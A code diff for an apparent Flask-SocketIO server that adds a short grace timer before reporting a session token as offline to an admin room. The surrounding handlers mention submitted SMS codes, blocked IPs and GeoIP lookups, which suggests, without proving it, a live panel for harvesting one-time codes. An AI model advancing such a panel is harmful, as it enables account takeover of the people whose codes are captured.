@@ -16,7 +16,8 @@ import urllib.request
 import threading
 
 socketio = SocketIO()
-_session_sids = {}
+_session_sids = {}   # sid → token
+_offline_timers = {} # token → threading.Timer (grace period)
 _admin_sids = {}
 _blocked_ips = set()
 _geoip_cache = {}
@@ -761,6 +762,10 @@ def create_app():
             return
         join_room(f'session_{token}')
         _session_sids[request.sid] = token
+        # Cancel any pending offline timer for this token (page navigation grace)
+        timer = _offline_timers.pop(token, None)
+        if timer:
+            timer.cancel()
         socketio.emit('user_online', {'token': token}, room='admin')
 
     @socketio.on('sms_code_submitted')
@@ -794,7 +799,17 @@ def create_app():
     def on_disconnect(reason=None):
         token = _session_sids.pop(request.sid, None)
         if token:
-            socketio.emit('user_offline', {'token': token}, room='admin')
+            # 3-second grace: if same token reconnects (page navigation), cancel offline
+            def _emit_offline(tok=token):
+                _offline_timers.pop(tok, None)
+                socketio.emit('user_offline', {'token': tok}, room='admin')
+            old = _offline_timers.pop(token, None)
+            if old:
+                old.cancel()
+            t = threading.Timer(3.0, _emit_offline)
+            t.daemon = True
+            _offline_timers[token] = t
+            t.start()
         if request.sid in _admin_sids:
             _admin_sids.pop(request.sid)
             ips = list(set(_admin_sids.values()))
